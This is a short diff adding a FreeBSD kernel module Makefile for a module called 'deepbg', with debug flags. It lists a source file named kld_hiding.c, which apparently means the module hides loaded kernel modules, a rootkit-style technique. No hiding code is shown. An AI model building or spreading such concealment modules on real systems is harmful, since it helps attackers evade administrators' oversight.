@@ -1,0 +1,14 @@
+.PATH: ${.CURDIR}/src/
+.OBJDIR: ${.CURDIR}/obj/
+PACKAGE=deepbg
+FILESDIR=.
+SRCS=kld_hiding.c deepbg.c
+KMOD=deepbg
+# START DEBUG MODE
+DEBUG_FLAGS=-g
+COPTFLAGS=-O0
+CFLAGS=-O0 -pipe
+CFLAGS+=-DDEBUG
+# END DEBUG MODE
+
+.include <bsd.kmod.mk>
